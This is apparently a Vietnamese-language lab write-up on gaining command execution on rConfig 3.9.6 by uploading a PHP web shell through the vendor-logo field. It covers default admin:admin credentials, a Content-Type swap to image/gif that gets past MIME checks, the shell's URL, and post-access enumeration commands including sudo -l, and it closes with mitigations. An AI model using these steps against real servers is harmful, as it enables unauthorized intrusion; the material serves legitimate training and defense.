# PHP Web Shell via File Upload

## Tổng quan

PHP là ngôn ngữ server-side. Nếu ứng dụng PHP có chức năng upload file không an toàn, attacker có thể upload PHP web shell và thực thi command trên hệ điều hành.

Chuỗi khai thác:

```text
Đăng nhập ứng dụng
→ tìm chức năng upload
→ upload PHP web shell
→ bypass file type validation
→ truy cập file qua URL
→ server thực thi PHP
→ có command execution
```

## Target trong lab

- Ứng dụng: rConfig 3.9.6
    
- Credential mặc định: `admin:admin`
    
- Chức năng: `Devices → Vendors → Add Vendor`
    
- Upload field: Vendor Logo
    
- Payload: WhiteWinterWolf PHP Web Shell
    
- Filename: `connect.php`
    
- URL sau upload: `/images/vendor/connect.php`
    

## Cấu hình Burp Proxy

```text
Proxy IP: 127.0.0.1
Proxy port: 8080
```

Bật `Intercept`, chọn file `.php`, nhấn Save và forward request cho tới khi thấy multipart POST chứa file upload.

## Bypass Content-Type

Request ban đầu:

```http
Content-Disposition: form-data;
name="vendorLogo";
filename="connect.php"

Content-Type: application/x-php
```

Sửa thành:

```http
Content-Type: image/gif
```

Filename vẫn là:

```text
connect.php
```

Nếu server chỉ kiểm tra MIME type do client cung cấp, file sẽ được chấp nhận.

## Vì sao bypass hoạt động?

```text
Upload validation kiểm tra:
Content-Type = image/gif → cho phép

Web server kiểm tra:
Extension = .php → thực thi PHP
```

Ứng dụng tin dữ liệu do client kiểm soát nhưng vẫn lưu file PHP trong web-accessible directory.

## Truy cập web shell

```text
http://TARGET/images/vendor/connect.php
```

PHP runtime thực thi file và trả giao diện web shell về browser.

## Enumeration ban đầu

```bash
whoami
id
hostname
pwd
uname -a
ls -la
sudo -l
```

Web shell thường là non-interactive shell và chạy dưới quyền web server user như `www-data` hoặc `apache`.

## Hạn chế của web shell

- Có thể bị ứng dụng tự động xóa.
    
- Không giữ working directory giữa các request.
    
- Chaining command có thể không hoạt động.
    
- Không có TTY.
    
- Dễ timeout hoặc mất kết nối.
    
- Để lại file, database record và web log.
    
- Có thể bị AV/WAF/EDR phát hiện.
    

Ưu tiên absolute path:

```bash
ls -la /var/www/html
```

thay vì phụ thuộc vào `cd` giữa nhiều request.

## Evidence cần ghi lại

- Filename payload.
    
- URL và filesystem upload path.
    
- Thời gian upload.
    
- Credential đã sử dụng.
    
- Request/response bypass.
    
- Commands đã chạy.
    
- SHA1/MD5 của payload.
    
- Cleanup đã thực hiện.
    

## Phòng chống

- Không tin MIME type từ client.
    
- Kiểm tra extension, magic bytes và nội dung.
    
- Chỉ cho phép allowlist định dạng cần thiết.
    
- Đổi filename thành giá trị ngẫu nhiên.
    
- Lưu file ngoài web root.
    
- Không cho phép script execution trong upload directory.
    
- Re-encode ảnh bằng thư viện xử lý ảnh.
    
- Thay credential mặc định.